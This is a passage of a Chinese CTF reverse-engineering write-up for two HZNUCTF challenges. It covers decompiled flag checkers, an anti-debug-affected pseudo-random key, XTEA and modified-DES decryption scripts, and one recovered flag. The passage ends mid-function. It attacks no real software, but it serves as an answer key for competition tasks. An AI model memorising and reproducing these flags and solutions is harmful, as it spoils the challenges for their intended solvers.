class="headerlink" title="XTEA"></a>XTEA</h3><p>考点总结：魔改XTEA，反调试，伪随机</p><p>题目描述：如题，貌似有点misc味? flag格式为HZNUCTF{}</p><p>WP:</p><p>拿到题目附件，解压缩，里面有个readme.txt、一个.zip和一个.exe，readme里面是压缩包密码，解压缩，是一个exe，和外面那个一样的，查壳，没有壳，64位的</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104173338545.png" alt="image-20250104173338545"></p><p>ida64打开分析，根据关键字符串跟踪到main函数</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104173438726.png" alt="image-20250104173438726"></p><pre><code class="language-c">__int64 sub_140011BE0()&#123;  char *v0; // rdi  __int64 i; // rcx  __int64 v2; // rax  __int64 v3; // rdi  char v5[32]; // [rsp+0h] [rbp-20h] BYREF  char v6; // [rsp+20h] [rbp+0h] BYREF  int v7[9]; // [rsp+24h] [rbp+4h] BYREF  void *Block; // [rsp+48h] [rbp+28h]  void *v9; // [rsp+68h] [rbp+48h]  int v10[15]; // [rsp+88h] [rbp+68h] BYREF  int j; // [rsp+C4h] [rbp+A4h]  int k; // [rsp+E4h] [rbp+C4h]  int m; // [rsp+104h] [rbp+E4h]  int v14; // [rsp+1D4h] [rbp+1B4h]  v0 = &amp;v6;  for ( i = 66i64; i; --i )  &#123;    *(_DWORD *)v0 = -858993460;    v0 += 4;  &#125;  sub_1400113A2(&amp;unk_1400220A7);  srand(0x7E9u);  sub_140011181();  printf(&quot;Welcome to HZNUCTF!!!\n&quot;);  printf(&quot;Plz input the cipher:\n&quot;);  v7[0] = 0;  if ( (unsigned int)scanf(&quot;%d&quot;, v7) == 1 )     // 输入delta  &#123;    printf(&quot;Plz input the flag:\n&quot;);    Block = malloc(0x21ui64);    v9 = malloc(0x10ui64);    if ( (unsigned int)scanf(&quot;%s&quot;, (const char *)Block) == 1 )// 输入flag    &#123;      for ( j = 0; j &lt; 32; j += 4 )      &#123;        v14 = *((char *)Block + j + 3) | (*((char *)Block + j + 2) &lt;&lt; 8) | (*((char *)Block + j + 1) &lt;&lt; 16) | (*((char *)Block + j) &lt;&lt; 24);// 字符串处理        v10[j / 4] = v14;      &#125;      sub_1400110B9(v9);      for ( k = 0; k &lt; 7; ++k )        sub_140011212((unsigned int)v7[0], &amp;v10[k], &amp;v10[k + 1], v9);// 加密      for ( m = 0; m &lt; 8; ++m )      &#123;        if ( v10[m] != dword_14001D000[m] )     // cmp        &#123;          printf(&quot;wrong_wrong!!!&quot;);          exit(1);        &#125;      &#125;      printf(&quot;Congratulation!!!&quot;);      free(Block);      free(v9);      v2 = 0i64;    &#125;    else    &#123;      printf(&quot;Invalid input.\n&quot;);      free(Block);      free(v9);      v2 = 1i64;    &#125;  &#125;  else  &#123;    printf(&quot;Invalid input.\n&quot;);    v2 = 1i64;  &#125;  v3 = v2;  sub_14001133E(v5, &amp;unk_14001AD40);  return v3;&#125;</code></pre><p>根据代码逻辑对一些函数进行重命名，同时对一些函数功能进行注释</p><p>整体逻辑就是先输入一个密码，这个密码也就是前面给的压缩包的解压密码，转成十六进制是0x9E3779B9，很明显就是xtea加密的delta</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104173837132.png" alt="image-20250104173837132"></p><p>首先是加密所用到的key，在sub_1400110B9函数中进行初始化</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104174038200.png" alt="image-20250104174038200"></p><p>可以看到就是一个伪随机，但是种子是在函数的最开始</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104175434787.png" alt="image-20250104175434787"></p><p>那么就可以根据已知的种子获取key的值，或者动态调试拿key，但是这里有一个反调试，在sub_140011181函数里</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104175419437.png" alt="image-20250104175419437"></p><p>检测到调式的话伪随机的种子就会改变</p><p>导致key也不一样，想通过动调拿key简单绕一下就可以了</p><p>下面是获取key的脚本</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;time.h&gt;int main() &#123;    srand(0x7e8u);    for (int i = 0; i &lt; 4; i++) &#123;        printf(&quot;%d\n&quot;, rand());    &#125;    return 0;&#125;</code></pre><p>key</p><blockquote><p>6648<br>4542<br>2449<br>13336</p></blockquote><p>初始完了key，这里有一个for循环，就是处理输入的32位的明文，分成八组进行加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250104175909142.png" alt="image-20250104175909142"></p><p>然后是加密函数，通过查看sub_140011212函数可知是一个没有进行魔改的xtea加密，但是在明文传进去的时候做了一些改变，不是和标准的xtea以01 23 45这样的组合进行加密，而是01 12 23这样的组合，那么在解密的时候需要倒着来进行解密</p><p>以下就是解密脚本</p><pre><code class="language-c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#define delta 0x9E3779B9void decrypt(uint32_t* enc, uint32_t* key) &#123;    unsigned int sum, i;    uint32_t v1, v2;    v1 = enc[0];    v2 = enc[1];    sum = 32 * -delta;    for (i = 0; i &lt; 32; i++) &#123;        v2 -= (key[(sum &gt;&gt; 11) &amp; 3] + sum) ^ (v1 + ((v1 &gt;&gt; 5) ^ (16 * v1)));        sum += delta;        v1 -= (key[sum &amp; 3] + sum) ^ (v2 + ((v2 &gt;&gt; 5) ^ (16 * v2)));    &#125;    enc[0] = v1;    enc[1] = v2;&#125;void print_as_big_endian(uint32_t value) &#123;    // 将每个字节打印出来，按大端序排列    for (int i = 3; i &gt;= 0; i--) &#123;  // 从最高字节开始输出        printf(&quot;%c&quot;, (unsigned char)((value &gt;&gt; (i * 8)) &amp; 0xFF));  // 提取字节并打印    &#125;&#125;int main() &#123;    uint32_t key[4];      key[0] = 6648;    key[1] = 4542;    key[2] = 2449;    key[3] = 13336;    uint32_t enc[8];    enc[0] = 0x8ccb2324;    enc[1] = 0x09a7741a;    enc[2] = 0xfb3c678d;    enc[3] = 0xf6083a79;    enc[4] = 0xf1cc241b;    enc[5] = 0x39fa59f2;    enc[6] = 0xf2abe1cc;    enc[7] = 0x17189f72;    for (int index = 6; index &gt;= 0; index--) &#123;          decrypt(&amp;enc[index], key);    &#125;    for (int i = 0; i &lt; 8; i++) &#123;        print_as_big_endian(enc[i]);  // 打印按大端序的值    &#125;    printf(&quot;\n&quot;);    puts((char *)enc);      return 0;&#125;</code></pre><p><strong>HZNUCTF{ae6-9f57-4b74-b423-98eb}</strong></p><hr><h3 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h3><p>考点总结：PE文件格式，UPX壳，自定义加密，魔改DES</p><p>题目描述：嘶，为什么不能运行呢，但好像也不影响？ flag格式为HZNUCTF{}</p><p>WP：</p><p>根据题目描述，把文件位数改成64bit，就可以正常运行程序了。用die可以查出这是64位的文件，但是用010打开来看不符合64位文件的格式</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250301115519561.png" alt="image-20250301115519561"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250209134613624.png" alt="image-20250209134613624"></p><p>把0B 01改成0B 02。ida64打开分析，根据关键字符串定位到main函数</p><p>然后依据逻辑对一些变量和函数名进行重命名</p><pre><code class="language-c">__int64 sub_140012F90()&#123;  char *v0; // rdi  __int64 i; // rcx  char v3[32]; // [rsp+0h] [rbp-20h] BYREF  char v4; // [rsp+20h] [rbp+0h] BYREF  char *flag; // [rsp+28h] [rbp+8h]  char Destination[44]; // [rsp+48h] [rbp+28h] BYREF  char Str1[36]; // [rsp+74h] [rbp+54h] BYREF  char *v8; // [rsp+98h] [rbp+78h]  char v9[100]; // [rsp+C0h] [rbp+A0h] BYREF  int j; // [rsp+124h] [rbp+104h]  unsigned __int8 v11; // [rsp+144h] [rbp+124h]  unsigned __int8 v12; // [rsp+164h] [rbp+144h]  char v13[32]; // [rsp+184h] [rbp+164h] BYREF  char v14[32]; // [rsp+1A4h] [rbp+184h] BYREF  char v15; // [rsp+1C4h] [rbp+1A4h]  v0 = &amp;v4;  for ( i = 114i64; i; --i )  &#123;    *(_DWORD *)v0 = -858993460;    v0 += 4;  &#125;  sub_1400113CA(&amp;unk_1400260A6);  flag = (char *)malloc(0x2Aui64);  printf(&quot;Welcome to HZNUCTF!!!\n&quot;);  printf(&quot;Plz input the flag:\n&quot;);  scanf(&amp;aS, flag);  strncpy_s(Destination, 9ui64, flag, 8ui64);  strncpy_s(Str1, 2ui64, flag + 40, 1ui64);  if ( !j_strcmp(Destination, &quot;HZNUCTF&#123;&quot;) &amp;&amp; !j_strcmp(Str1, &quot;&#125;&quot;) )  &#123;    v8 = (char *)malloc(0x24ui64);    strncpy_s(v8, 0x24ui64, flag + 8, 0x20ui64);    memset(v9, 0, 0x41ui64);    for ( j = 0; j &lt; 32; j += 2 )    &#123;      v11 = 0;      v12 = 0;      memset(v13, 0, 5ui64);      memset(v14, 0, 3ui64);      v11 = v8[j];      sub_140011393(v13, &quot;%x&quot;, v11);      v12 = v8[j + 1];      sub_140011393(v14, &quot;%x&quot;, v12);      j_strcat(v13, v14);      v15 = v13[1];      v13[1] = v13[2];      v13[2] = v15;      j_strcat(v9, v13);    &#125;    sub_1400113ED(v9, Destination);    printf(&quot;Congratulation!!!\n&quot;);    free(v8);  &#125;  free(flag);  sub_14001135C(v3, &amp;unk_14001D390);  return 0i64;&#125;</code></pre><p>程序的整体逻辑就是先对输入的flag进行格式检查，是否满足HZNUCTF{}，然后对大括号内的内容进行加密处理，先把每一个字符转成十六进制，然后将这些十六进制转为字符串，并将每四个字符中的两个进行交换位置，最后传入sub_1400113ED函数进行魔改的DES加密，这里可以利用插件识别出是DES加密</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250209141110123.png" alt="image-20250209141110123"></p><p>并且最终check的密文就在此函数中</p><pre><code class="language-c">__int64 __fastcall sub_140017F30(int a1, int a2)&#123;  char *v2; // rdi  __int64 i; // rcx  int v4; // edx  char v6[32]; // [rsp+0h] [rbp-30h] BYREF  char v7; // [rsp+30h] [rbp+0h] BYREF  char Src[96]; // [rsp+40h] [rbp+10h] BYREF  char v9[64]; // [rsp+A0h] [rbp+70h] BYREF  int j; // [rsp+F4h] [rbp+C4h]  v2 = &amp;v7;  for ( i = 58i64; i; --i )  &#123;    *(_DWORD *)v2 = -858993460;    v2 += 4;  &#125;  sub_1400113CA(&amp;unk_1400260A6);  j_memcpy(v9, Src, sizeof(v9));  LOBYTE(v4) = 8;  sub_1400113B6(a2, v4, a1, (unsigned int)Src, 8);  for ( j = 0; j &lt; 64; ++j )  &#123;    if ( (unsigned __int8)Src[j] != enc[j] )    &#123;      printf(&quot;wrong_wrong!!!\n&quot;);      exit(1);    &#125;  &#125;  return sub_14001135C(v6, &amp;unk_14001D1F0);&#125;</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250209141513061.png" alt="image-20250209141513061"></p><p>标准的totrot是1,2,4,6,8,10,12,14,15,17,19,21,23,25,27,28，在网上找个脚本，把这个修改一下就可以正常解密了。这里DES解密的密钥是flag头<strong>HZNUCTF{</strong>，</p><pre><code class="language-c">#include &lt;string.h&gt;#include &lt;stdio.h&gt;#define EN0 0   /* MODE == encrypt */#define DE1 1   /* MODE == decrypt */typedef struct &#123;  unsigned long ek[32];  unsigned long dk[32];&#125; des_ctx;static unsigned long SP1[64] = &#123;    0x01010400L, 0x00000000L, 0x00010000L, 0x01010404L,    0x01010004L, 0x00010404L, 0x00000004L, 0x00010000L,    0x00000400L, 0x01010400L, 0x01010404L, 0x00000400L,    0x01000404L, 0x01010004L, 0x01000000L, 0x00000004L,    0x00000404L, 0x01000400L, 0x01000400L, 0x00010400L,    0x00010400L, 0x01010000L, 0x01010000L, 0x01000404L,    0x00010004L, 0x01000004L, 0x01000004L, 0x00010004L,    0x00000000L, 0x00000404L, 0x00010404L, 0x01000000L,    0x00010000L, 0x01010404L, 0x00000004L, 0x01010000L,    0x01010400L, 0x01000000L, 0x01000000L, 0x00000400L,    0x01010004L, 0x00010000L, 0x00010400L, 0x01000004L,    0x00000400L, 0x00000004L, 0x01000404L, 0x00010404L,    0x01010404L, 0x00010004L, 0x01010000L, 0x01000404L,    0x01000004L, 0x00000404L, 0x00010404L, 0x01010400L,    0x00000404L, 0x01000400L, 0x01000400L, 0x00000000L,    0x00010004L, 0x00010400L, 0x00000000L, 0x01010004L &#125;;static unsigned long SP2[64] = &#123;    0x80108020L, 0x80008000L, 0x00008000L, 0x00108020L,    0x00100000L, 0x00000020L, 0x80100020L, 0x80008020L,    0x80000020L, 0x80108020L, 0x80108000L, 0x80000000L,    0x80008000L, 0x00100000L, 0x00000020L, 0x80100020L,    0x00108000L, 0x00100020L, 0x80008020L, 0x00000000L,    0x80000000L, 0x00008000L, 0x00108020L, 0x80100000L,    0x00100020L, 0x80000020L, 0x00000000L, 0x00108000L,    0x00008020L, 0x80108000L, 0x80100000L, 0x00008020L,    0x00000000L, 0x00108020L, 0x80100020L, 0x00100000L,    0x80008020L, 0x80100000L, 0x80108000L, 0x00008000L,    0x80100000L, 0x80008000L, 0x00000020L, 0x80108020L,    0x00108020L, 0x00000020L, 0x00008000L, 0x80000000L,    0x00008020L, 0x80108000L, 0x00100000L, 0x80000020L,    0x00100020L, 0x80008020L, 0x80000020L, 0x00100020L,    0x00108000L, 0x00000000L, 0x80008000L, 0x00008020L,    0x80000000L, 0x80100020L, 0x80108020L, 0x00108000L &#125;;static unsigned long SP3[64] = &#123;    0x00000208L, 0x08020200L, 0x00000000L, 0x08020008L,    0x08000200L, 0x00000000L, 0x00020208L, 0x08000200L,    0x00020008L, 0x08000008L, 0x08000008L, 0x00020000L,    0x08020208L, 0x00020008L, 0x08020000L, 0x00000208L,    0x08000000L, 0x00000008L, 0x08020200L, 0x00000200L,    0x00020200L, 0x08020000L, 0x08020008L, 0x00020208L,    0x08000208L, 0x00020200L, 0x00020000L, 0x08000208L,    0x00000008L, 0x08020208L, 0x00000200L, 0x08000000L,    0x08020200L, 0x08000000L, 0x00020008L, 0x00000208L,    0x00020000L, 0x08020200L, 0x08000200L, 0x00000000L,    0x00000200L, 0x00020008L, 0x08020208L, 0x08000200L,    0x08000008L, 0x00000200L, 0x00000000L, 0x08020008L,    0x08000208L, 0x00020000L, 0x08000000L, 0x08020208L,    0x00000008L, 0x00020208L, 0x00020200L, 0x08000008L,    0x08020000L, 0x08000208L, 0x00000208L, 0x08020000L,    0x00020208L, 0x00000008L, 0x08020008L, 0x00020200L &#125;;static unsigned long SP4[64] = &#123;    0x00802001L, 0x00002081L, 0x00002081L, 0x00000080L,    0x00802080L, 0x00800081L, 0x00800001L, 0x00002001L,    0x00000000L, 0x00802000L, 0x00802000L, 0x00802081L,    0x00000081L, 0x00000000L, 0x00800080L, 0x00800001L,    0x00000001L, 0x00002000L, 0x00800000L, 0x00802001L,    0x00000080L, 0x00800000L, 0x00002001L, 0x00002080L,    0x00800081L, 0x00000001L, 0x00002080L, 0x00800080L,    0x00002000L, 0x00802080L, 0x00802081L, 0x00000081L,    0x00800080L, 0x00800001L, 0x00802000L, 0x00802081L,    0x00000081L, 0x00000000L, 0x00000000L, 0x00802000L,    0x00002080L, 0x00800080L, 0x00800081L, 0x00000001L,    0x00802001L, 0x00002081L, 0x00002081L, 0x00000080L,    0x00802081L, 0x00000081L, 0x00000001L, 0x00002000L,    0x00800001L, 0x00002001L, 0x00802080L, 0x00800081L,    0x00002001L, 0x00002080L, 0x00800000L, 0x00802001L,    0x00000080L, 0x00800000L, 0x00002000L, 0x00802080L &#125;;static unsigned long SP5[64] = &#123;    0x00000100L, 0x02080100L, 0x02080000L, 0x42000100L,    0x00080000L, 0x00000100L, 0x40000000L, 0x02080000L,    0x40080100L, 0x00080000L, 0x02000100L, 0x40080100L,    0x42000100L, 0x42080000L, 0x00080100L, 0x40000000L,    0x02000000L, 0x40080000L, 0x40080000L, 0x00000000L,    0x40000100L, 0x42080100L, 0x42080100L, 0x02000100L,    0x42080000L, 0x40000100L, 0x00000000L, 0x42000000L,    0x02080100L, 0x02000000L, 0x42000000L, 0x00080100L,    0x00080000L, 0x42000100L, 0x00000100L, 0x02000000L,    0x40000000L, 0x02080000L, 0x42000100L, 0x40080100L,    0x02000100L, 0x40000000L, 0x42080000L, 0x02080100L,    0x40080100L, 0x00000100L, 0x02000000L, 0x42080000L,    0x42080100L, 0x00080100L, 0x42000000L, 0x42080100L,    0x02080000L, 0x00000000L, 0x40080000L, 0x42000000L,    0x00080100L, 0x02000100L, 0x40000100L, 0x00080000L,    0x00000000L, 0x40080000L, 0x02080100L, 0x40000100L &#125;;static unsigned long SP6[64] = &#123;    0x20000010L, 0x20400000L, 0x00004000L, 0x20404010L,    0x20400000L, 0x00000010L, 0x20404010L, 0x00400000L,    0x20004000L, 0x00404010L, 0x00400000L, 0x20000010L,    0x00400010L, 0x20004000L, 0x20000000L, 0x00004010L,    0x00000000L, 0x00400010L, 0x20004010L, 0x00004000L,    0x00404000L, 0x20004010L, 0x00000010L, 0x20400010L,    0x20400010L, 0x00000000L, 0x00404010L, 0x20404000L,    0x00004010L, 0x00404000L, 0x20404000L, 0x20000000L,    0x20004000L, 0x00000010L, 0x20400010L, 0x00404000L,    0x20404010L, 0x00400000L, 0x00004010L, 0x20000010L,    0x00400000L, 0x20004000L, 0x20000000L, 0x00004010L,    0x20000010L, 0x20404010L, 0x00404000L, 0x20400000L,    0x00404010L, 0x20404000L, 0x00000000L, 0x20400010L,    0x00000010L, 0x00004000L, 0x20400000L, 0x00404010L,    0x00004000L, 0x00400010L, 0x20004010L, 0x00000000L,    0x20404000L, 0x20000000L, 0x00400010L, 0x20004010L &#125;;static unsigned long SP7[64] = &#123;    0x00200000L, 0x04200002L, 0x04000802L, 0x00000000L,    0x00000800L, 0x04000802L, 0x00200802L, 0x04200800L,    0x04200802L, 0x00200000L, 0x00000000L, 0x04000002L,    0x00000002L, 0x04000000L, 0x04200002L, 0x00000802L,    0x04000800L, 0x00200802L, 0x00200002L, 0x04000800L,    0x04000002L, 0x04200000L, 0x04200800L, 0x00200002L,    0x04200000L, 0x00000800L, 0x00000802L, 0x04200802L,    0x00200800L, 0x00000002L, 0x04000000L, 0x00200800L,    0x04000000L, 0x00200800L, 0x00200000L, 0x04000802L,    0x04000802L, 0x04200002L, 0x04200002L, 0x00000002L,    0x00200002L, 0x04000000L, 0x04000800L, 0x00200000L,    0x04200800L, 0x00000802L, 0x00200802L, 0x04200800L,    0x00000802L, 0x04000002L, 0x04200802L, 0x04200000L,    0x00200800L, 0x00000000L, 0x00000002L, 0x04200802L,    0x00000000L, 0x00200802L, 0x04200000L, 0x00000800L,    0x04000002L, 0x04000800L, 0x00000800L, 0x00200002L &#125;;static unsigned long SP8[64] = &#123;    0x10001040L, 0x00001000L, 0x00040000L, 0x10041040L,    0x10000000L, 0x10001040L, 0x00000040L, 0x10000000L,    0x00040040L, 0x10040000L, 0x10041040L, 0x00041000L,    0x10041000L, 0x00041040L, 0x00001000L, 0x00000040L,    0x10040000L, 0x10000040L, 0x10001000L, 0x00001040L,    0x00041000L, 0x00040040L, 0x10040040L, 0x10041000L,    0x00001040L, 0x00000000L, 0x00000000L, 0x10040040L,    0x10000040L, 0x10001000L, 0x00041040L, 0x00040000L,    0x00041040L, 0x00040000L, 0x10041000L, 0x00001000L,    0x00000040L, 0x10040040L, 0x00001000L, 0x00041040L,    0x10001000L, 0x00000040L, 0x10000040L, 0x10040000L,    0x10040040L, 0x10000000L, 0x00040000L, 0x10001040L,    0x00000000L, 0x10041040L, 0x00040040L, 0x10000040L,    0x10040000L, 0x10001000L, 0x10001040L, 0x00000000L,    0x10041040L, 0x00041000L, 0x00041000L, 0x00001040L,    0x00001040L, 0x00040040L, 0x10000000L, 0x10041000L &#125;;#define   CRCSEED 0x7529static void scrunch(unsigned char *, unsigned long *);static void unscrun(unsigned long *, unsigned char *);static void desfunc(unsigned long *, unsigned long *);static void cookey(unsigned long *);void usekey(register unsigned long *from);static unsigned long KnL[32] = &#123; 0L &#125;;//static unsigned long KnR[32] = &#123; 0L &#125;;//static unsigned long Kn3[32] = &#123; 0L &#125;;//static unsigned char Df_Key[24] = &#123;//  0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,//  0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10,//  0x89,0xab,0xcd,0xef,0x01,0x23,0x45,0x67 &#125;;static unsigned short bytebit[8]    = &#123;    0200, 0100, 040, 020, 010, 04, 02, 01 &#125;;static unsigned long bigbyte[24] = &#123;    0x800000L,  0x400000L,  0x200000L,  0x100000L,    0x80000L,   0x40000L,   0x20000L,   0x10000L,    0x8000L,    0x4000L,    0x2000L,    0x1000L,    0x800L,     0x400L,     0x200L,     0x100L,    0x80L,      0x40L,      0x20L,      0x10L,    0x8L,       0x4L,       0x2L,       0x1L    &#125;;/* Use the key schedule specified in the Standard (ANSI X3.92-1981). */ static unsigned char pc1[56] = &#123;    56, 48, 40, 32, 24, 16,  8,  0, 57, 49, 41, 33, 25, 17,     9,  1, 58, 50, 42, 34, 26, 18, 10,  2, 59, 51, 43, 35,    62, 54, 46, 38, 30, 22, 14,  6, 61, 53, 45, 37, 29, 21,    13,  5, 60, 52, 44, 36, 28, 20, 12,  4, 27, 19, 11,  3 &#125;;static unsigned char totrot[16] = &#123;                                                 //魔改的地方    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16&#125;;static unsigned char pc2[48] = &#123;    13, 16, 10, 23,  0,  4,  2, 27, 14,  5, 20,  9,    22, 18, 11,  3, 25,  7, 15,  6, 26, 19, 12,  1,    40, 51, 30, 36, 46, 54, 29, 39, 50, 44, 32, 47,    43, 48, 38, 55, 33, 52, 45, 41, 49, 35, 28, 31 &#125;;void deskey(unsigned char *key,short edf)   /* Thanks to James Gillogly &amp; Phil Karn! */&#123;    register int i, j, l, m, n;    unsigned char pc1m[56], pcr[56];    unsigned long kn[32];    for ( j = 0; j &lt; 56; j++ )     &#123;        l = pc1[j];        m = l &amp; 07;        pc1m[j] = (key[l &gt;&gt; 3] &amp; bytebit[m]) ? 1 : 0;    &#125;    for( i = 0; i &lt; 16; i++ )    &#123;        if( edf == DE1 ) m = (15 - i) &lt;&lt; 1;        else m = i &lt;&lt; 1;        n = m + 1;        kn[m] = kn[n] = 0L;        for( j = 0; j &lt; 28; j++ )        &#123;            l = j + totrot[i];            if( l &lt; 28 ) pcr[j] = pc1m[l];            else pcr[j] = pc1m[l - 28];        &#125;        for( j = 28; j &lt; 56; j++ )         &#123;            l = j + totrot[i];            if( l &lt; 56 ) pcr[j] = pc1m[l];            else pcr[j] = pc1m[l - 28];        &#125;        for( j = 0; j &lt; 24; j++ )         &#123;            if( pcr[pc2[j]] ) kn[m] |= bigbyte[j];            if( pcr[pc2[j+24]] ) kn[n] |= bigbyte[j];        &#125;    &#125;    cookey(kn);    return;&#125;static void cookey(register unsigned long *raw1)&#123;    register unsigned long *cook, *raw0;    unsigned long dough[32];    register int i;    cook = dough;    for( i = 0; i &lt; 16; i++, raw1++ )     &#123;        raw0 = raw1++;        *cook    = (*raw0 &amp; 0x00fc0000L) &lt;&lt; 6;        *cook   |= (*raw0 &amp; 0x00000fc0L) &lt;&lt; 10;        *cook   |= (*raw1 &amp; 0x00fc0000L) &gt;&gt; 10;        *cook++ |= (*raw1 &amp; 0x00000fc0L) &gt;&gt; 6;        *cook    = (*raw0 &amp; 0x0003f000L) &lt;&lt; 12;        *cook   |= (*raw0 &amp; 0x0000003fL) &lt;&lt; 16;        *cook   |= (*raw1 &amp; 0x0003f000L) &gt;&gt; 4;        *cook++ |= (*raw1 &amp; 0x0000003fL);    &#125;    usekey(dough);    return;&#125;void cpkey(register unsigned long *into)&#123;    register unsigned long *from, *endp;    from = KnL, endp = &amp;KnL[32];    while( from &lt; endp ) *into++ = *from++;    return;&#125;void usekey(register unsigned long *from)&#123;    register unsigned long *to, *endp;    to = KnL, endp = &amp;KnL[32];    while( to &lt; endp ) *to++ = *from++;    return;&#125;void des(unsigned char *inblock, unsigned char *outblock)&#123;    unsigned long work[2];    scrunch(inblock, work);    desfunc(work, KnL);    unscrun(work, outblock);    return;&#125;static void scrunch(register unsigned char *outof, register unsigned long *into)&#123;    *into    = (*outof++ &amp; 0xffL) &lt;&lt; 24;    *into   |= (*outof++ &amp; 0xffL) &lt;&lt; 16;    *into   |= (*outof++ &amp; 0xffL) &lt;&lt; 8;    *into++ |= (*outof++ &amp; 0xffL);    *into    = (*outof++ &amp; 0xffL) &lt;&lt; 24;    *into   |= (*outof++ &amp; 0xffL) &lt;&lt; 16;    *into   |= (*outof++ &amp; 0xffL) &lt;&lt; 8;    *into   |= (*outof   &amp; 0xffL);    return;&#125;static void unscrun(register unsigned long *outof, register unsigned char *into)&#123;    *into++ = (unsigned char)((*outof &gt;&gt; 24) &amp; 0xffL);    *into++ = (unsigned char)((*outof &gt;&gt; 16) &amp; 0xffL);    *into++ = (unsigned char)((*outof &gt;&gt;  8) &amp; 0xffL);    *into++ = (unsigned char)(*outof++   &amp; 0xffL);    *into++ = (unsigned char)((*outof &gt;&gt; 24) &amp; 0xffL);    *into++ = (unsigned char)((*outof &gt;&gt; 16) &amp; 0xffL);    *into++ = (unsigned char)((*outof &gt;&gt;  8) &amp; 0xffL);    *into   =  (unsigned char)(*outof    &amp; 0xffL);    return;&#125;static void desfunc(register unsigned long *block,register unsigned long *keys)&#123;    register unsigned long fval, work, right, leftt;    register int round;        leftt = block[0];    right = block[1];    work = ((leftt &gt;&gt; 4) ^ right) &amp; 0x0f0f0f0fL;    right ^= work;    leftt ^= (work &lt;&lt; 4);    work = ((leftt &gt;&gt; 16) ^ right) &amp; 0x0000ffffL;    right ^= work;    leftt ^= (work &lt;&lt; 16);    work = ((right &gt;&gt; 2) ^ leftt) &amp; 0x33333333L;    leftt ^= work;    right ^= (work &lt;&lt; 2);    work = ((right &gt;&gt; 8) ^ leftt) &amp; 0x00ff00ffL;    leftt ^= work;    right ^= (work &lt;&lt; 8);    right = ((right &lt;&lt; 1) | ((right &gt;&gt; 31) &amp; 1L)) &amp; 0xffffffffL;    work = (leftt ^ right) &amp; 0xaaaaaaaaL;    leftt ^= work;    right ^= work;    leftt = ((leftt &lt;&lt; 1) | ((leftt &gt;&gt; 31) &amp; 1L)) &amp; 0xffffffffL;        for( round = 0; round &lt; 8; round++ )     &#123;        work  = (right &lt;&lt; 28) | (right &gt;&gt; 4);        work ^= *keys++;        fval  = SP7[ work        &amp; 0x3fL];        fval |= SP5[(work &gt;&gt;  8) &amp; 0x3fL];        fval |= SP3[(work &gt;&gt; 16) &amp; 0x3fL];        fval |= SP1[(work &gt;&gt; 24) &amp; 0x3fL];        work  = right ^ *keys++;        fval |= SP8[ work        &amp; 0x3fL];        fval |= SP6[(work &gt;&gt;  8) &amp; 0x3fL];        fval |= SP4[(work &gt;&gt; 16) &amp; 0x3fL];        fval |= SP2[(work &gt;&gt; 24) &amp; 0x3fL];        leftt ^= fval;        work  = (leftt &lt;&lt; 28) | (leftt &gt;&gt; 4);        work ^= *keys++;        fval  = SP7[ work        &amp; 0x3fL];        fval |= SP5[(work &gt;&gt;  8) &amp; 0x3fL];        fval |= SP3[(work &gt;&gt; 16) &amp; 0x3fL];        fval |= SP1[(work &gt;&gt; 24) &amp; 0x3fL];        work  = leftt ^ *keys++;        fval |= SP8[ work        &amp; 0x3fL];        fval |= SP6[(work &gt;&gt;  8) &amp; 0x3fL];        fval |= SP4[(work &gt;&gt; 16) &amp; 0x3fL];        fval |= SP2[(work &gt;&gt; 24) &amp; 0x3fL];        right ^= fval;    &#125;            right = (right &lt;&lt; 31) | (right &gt;&gt; 1);    work = (leftt ^ right) &amp; 0xaaaaaaaaL;    leftt ^= work;    right ^= work;    leftt = (leftt &lt;&lt; 31) | (leftt &gt;&gt; 1);    work = ((leftt &gt;&gt; 8) ^ right) &amp; 0x00ff00ffL;    right ^= work;    leftt ^= (work &lt;&lt; 8);    work = ((leftt &gt;&gt; 2) ^ right) &amp; 0x33333333L;    right ^= work;    leftt ^= (work &lt;&lt; 2);    work = ((right &gt;&gt; 16) ^ leftt) &amp; 0x0000ffffL;    leftt ^= work;    right ^= (work &lt;&lt; 16);    work = ((right &gt;&gt; 4) ^ leftt) &amp; 0x0f0f0f0fL;    leftt ^= work;    right ^= (work &lt;&lt; 4);    *block++ = right;    *block = leftt;    return;&#125;/* Validation sets: * * Single-length key, single-length plaintext - * Key    : 0123 4567 89ab cdef * Plain  : 0123 4567 89ab cde7 * Cipher : c957 4425 6a5e d31d *****************************************************************/void des_key(des_ctx *dc, unsigned char *key)&#123;    deskey(key,EN0);    cpkey(dc-&gt;ek);    deskey(key,DE1);    cpkey(dc-&gt;dk);&#125;/*Encrypt several blocks in ECB mode. Caller is responsible for short blocks. */void des_enc(des_ctx *dc, unsigned char *data, int blocks)&#123;    unsigned long work[2];    int i;    unsigned char *cp;    cp=data;    for(i=0;i&lt;blocks;i++)    &#123;        scrunch(cp,work);        desfunc(work,dc-&gt;ek);        unscrun(work,cp);        cp+=8;    &#125;&#125;void des_dec(des_ctx *dc, unsigned char *data, int blocks)&#123;    unsigned long work[2];    int i;    unsigned char *cp;    cp=data;    for(i=0;i&lt;blocks;i++)    &#123;        scrunch(cp,work);        desfunc(work,dc-&gt;dk);        unscrun(work,cp);        cp+=8;    &#125;&#125;int des_encrypt(const unsigned char* Key,const unsigned char KeyLen,const unsigned char* PlainContent,unsigned char* 